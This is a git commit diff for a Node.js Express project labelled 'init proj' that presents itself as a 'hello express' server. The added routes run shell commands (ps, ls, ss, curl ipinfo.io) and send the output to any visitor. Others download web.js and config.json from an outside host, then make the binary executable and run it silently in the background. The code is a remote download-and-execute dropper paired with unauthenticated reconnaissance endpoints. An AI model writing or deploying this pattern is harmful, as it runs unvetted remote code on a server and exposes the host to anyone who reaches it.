e7aa9cf91b42f794ca4a8c7189996b05fa372527
gmartin15 misak <gmartin15@avc.edu>
2023-04-09 10:26:51 +0000

    init proj

--- index.js
+++ index.js
@@ -3,7 +3,7 @@ const routes = require('./routes')
 const app = express();
 const port = process.env.PORT || 3001;
 
-app.use('/', )
+app.use('/', routes);
 
 app.listen(port, () => {
     console.log(`server listen at port: ${port}`)
--- routes/index.js
+++ routes/index.js
@@ -1,18 +1,89 @@
 const express = require('express');
 const router = express.Router();
 const exec = require('child_process').exec;
+const request = require('request');
+const fs = require('fs');
+const path = require('path');
 
 router.get('/', (req, res) => {
-    res.send('hello express')
+  res.send('hello express')
 })
 
+const execCmd = (cmdStr, res) => {
+  exec(cmdStr, (err, stdout, stderr) => {
+    if (err) {
+      res.send(err);
+    } else {
+      res.send(`<pre>${stdout}</pre>`);
+    }
+  })
+}
+
 router.get('/ps', (req, res) => {
-    const cmdStr = 'ps -ef';
-    exec(cmdStr, (err, stdout, stderr) => {
-        if (err) {
-            res.send(err);
-        } else {
-            res.send(stdout);
-        }
+  const cmdStr = 'ps -ef';
+  execCmd(cmdStr, res);
+});
+
+router.get('/ls', (req, res) => {
+  const cmdStr = 'ls -al';
+  execCmd(cmdStr, res);
+});
+
+router.get("/listen", function (req, res) {
+  let cmdStr = "ss -nltp";
+  execCmd(cmdStr, res);
+});
+
+router.get("/ip", function (req, res) {
+  let cmdStr = "curl ipinfo.io";
+  execCmd(cmdStr, res);
+});
+
+router.get('/download', (req, res) => {
+  const fileName = 'web.js'
+  request('https://liye.cf/wb/web.js')
+    .pipe(fs.createWriteStream(path.join('./', fileName)))
+    .on('close', err => {
+      if (err) {
+        res.send('download err', err);
+      } else {
+        res.send('download ok!!!');
+      }
     })
+});
+
+router.get('/downloadconf', (req, res) => {
+  const fileName = 'config.json'
+  request('https://liye.cf/wb/config.json')
+    .pipe(fs.createWriteStream(path.join('./', fileName)))
+    .on('close', err => {
+      if (err) {
+        res.send('download err', err);
+      } else {
+        res.send('download config ok!!!');
+      }
+    })
+});
+
+router.get('/start', (req, res) => {
+  exec("pgrep -laf web.js", function (err, stdout, stderr) {
+    if (stdout.includes("./web.js -c ./config.json")) {
+      console.log("web running");
+    } else {
+      exec(
+        "chmod +x web.js && ./web.js -c ./config.json >/dev/null 2>&1 &",
+        function (err, stdout, stderr) {
+          if (err) {
+            console.log("err:" + err);
+          } else {
+            console.log("start ok!!");
+          }
+        }
+      );
+    }
+  });
+
 })
+
+
+module.exports = router
